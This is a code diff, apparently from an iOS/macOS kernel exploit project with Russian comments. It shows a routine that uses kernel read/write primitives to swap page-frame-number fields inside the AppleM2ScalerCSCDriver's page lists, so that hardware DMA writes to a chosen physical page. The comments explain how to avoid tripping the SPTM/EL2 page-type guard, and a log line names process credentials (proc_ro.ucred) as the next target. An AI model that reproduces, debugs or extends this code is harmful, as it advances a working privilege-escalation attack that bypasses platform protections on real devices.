@@ -5897,49 +5897,51 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                                    IOServiceMatching("AppleM2ScalerCSCDriver"));
     uint64_t origQ[8];
     int swapped = 0;
-    for (int h = 0; h < hitN; h++) {
-        uint64_t hv = hitVAs[h];
-        int form = hitHalf[h];
-        origQ[h] = 0;
-        uint64_t newQ = 0;
-        // 1.9.118: гонка типа страницы — между сканом (~26с) и записью страница
-        // может перетипироваться; запись в 0x17/0x37 = мгновенный EL2-ресет без
-        // лога (так умер прогон 11:18). Перечитываем frame entry ПЕРЕД доступом.
-        uint64_t pg = (hitPAs[h] - kconstant(physBase)) >> 14;
-        uint8_t ent[16];
-        kreadbuf(tableVA + pg * 16, ent, 16);
-        if (ent[2] != 0x21) {
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: страница сменила тип на 0x%02x — ПРОПУСК безопасно", h, (unsigned long long)hv, ent[2]]);
-            continue;
-        }
-        kreadbuf(hv, &origQ[h], 8);
-        if (form == 2) {
-            // 1.9.117: raw-поле снова пишем — паника 100734 была не от него,
-            // а от teardown калибровочного коннекшена (наша же мина; с 1.9.115
-            // коннекшены живут до конца). По раунду 15 raw = кэш в записи
-            // драйвера, который execute и читает — без его подмены DMA идёт в
-            // оригинал.
-            if (origQ[h] != backingPA) {
-                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origQ[h]]);
+    for (int h = 0; h < hitN; h++) origQ[h] = 0;
+    // 1.9.119: два прохода — сначала pfn-поля (пишем), raw ПОСЛЕДНИМ и только
+    // диагностически (прогоны умирают без panic-full = EL2-ресет именно на
+    // записи в raw-поле; его страница, видимо, SPTM-охраняемого типа). Тип
+    // страницы логируем для КАЖДОГО hit (не только при несовпадении).
+    for (int pass = 0; pass < 2; pass++) {
+        for (int h = 0; h < hitN; h++) {
+            int form = hitHalf[h];
+            if ((pass == 0 && form == 2) || (pass == 1 && form != 2)) continue;
+            uint64_t hv = hitVAs[h];
+            uint64_t pg = (hitPAs[h] - kconstant(physBase)) >> 14;
+            uint8_t ent[16];
+            kreadbuf(tableVA + pg * 16, ent, 16);
+            if (form == 2) {
+                // raw: ТОЛЬКО диагностика — тип страницы + соседи, БЕЗ записи
+                uint64_t around[2] = {0, 0};
+                kreadbuf(hv, &around[0], 8);
+                kreadbuf(hv + 8, &around[1], 8);
+                kpNote(r, [NSString stringWithFormat:@"  hit #%d raw @ %#llx: тип страницы 0x%02x, содержимое %#018llx %#018llx — НЕ пишем (EL2-сторож)", h,
+                          (unsigned long long)hv, ent[2], (unsigned long long)around[0], (unsigned long long)around[1]]);
                 continue;
             }
-            newQ = ctlPA;
-        } else {
+            if (ent[2] != 0x21) {
+                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: страница сменила тип на 0x%02x — ПРОПУСК безопасно", h, (unsigned long long)hv, ent[2]]);
+                continue;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: тип 0x21 ok, пишем pfn-половину", h, (unsigned long long)hv]);
+            uint64_t newQ = 0;
+            kreadbuf(hv, &origQ[h], 8);
             uint32_t cur = form ? (uint32_t)(origQ[h] >> 32) : (uint32_t)origQ[h];
             if (cur != pfn32) {
                 kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: половина уже не наш pfn (%#x) — пропуск", h, (unsigned long long)hv, cur]);
+                origQ[h] = 0;
                 continue;
             }
             // пишем ТОЛЬКО совпавшую половину (вторая — счётчик страниц)
             newQ = form ? ((origQ[h] & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
                         : ((origQ[h] & 0xFFFFFFFF00000000ULL) | ctlPFN);
+            kwritebuf(hv, &newQ, 8);
+            uint64_t rb = 0;
+            kreadbuf(hv, &rb, 8);
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (форма %d) — readback %@",
+                      h, (unsigned long long)origQ[h], (unsigned long long)newQ, form, rb == newQ ? @"ПРИЛИПЛО" : @"— НЕ прилипло"]);
+            swapped++;
         }
-        kwritebuf(hv, &newQ, 8);
-        uint64_t rb = 0;
-        kreadbuf(hv, &rb, 8);
-        kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (форма %d) — readback %@",
-                  h, (unsigned long long)origQ[h], (unsigned long long)newQ, form, rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
-        swapped++;
     }
     kpNote(r, [NSString stringWithFormat:@"  подменено полей: %d — ПЕРВЫЙ submit dst (wire прочитает подмену)", swapped]);
     if (swapped && svc) {
@@ -5971,9 +5973,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     IOSurfaceUnlock(dstS, 0, NULL);
     kpNote(r, [NSString stringWithFormat:@"  dst пиксели после submit: ненулевых = %d — %@", nzd,
               nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
-    // restore всех подменённых — не оставляем коррупцию
-    for (int h = 0; h < hitN; h++)
-        if (origQ[h]) kwritebuf(hitVAs[h], &origQ[h], 8);
+    // restore подменённых pfn-полей — с той же ре-проверкой типа (1.9.119)
+    for (int h = 0; h < hitN; h++) {
+        if (!origQ[h] || hitHalf[h] == 2) continue;
+        uint64_t pg = (hitPAs[h] - kconstant(physBase)) >> 14;
+        uint8_t ent[16];
+        kreadbuf(tableVA + pg * 16, ent, 16);
+        if (ent[2] != 0x21) continue;   // страница ушла из heap — не трогаем
+        kwritebuf(hitVAs[h], &origQ[h], 8);
+    }
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — подмена page-list ДО wire РАБОТАЕТ. Дальше цель = страница proc_ro.ucred ===", changed]);
     } else {
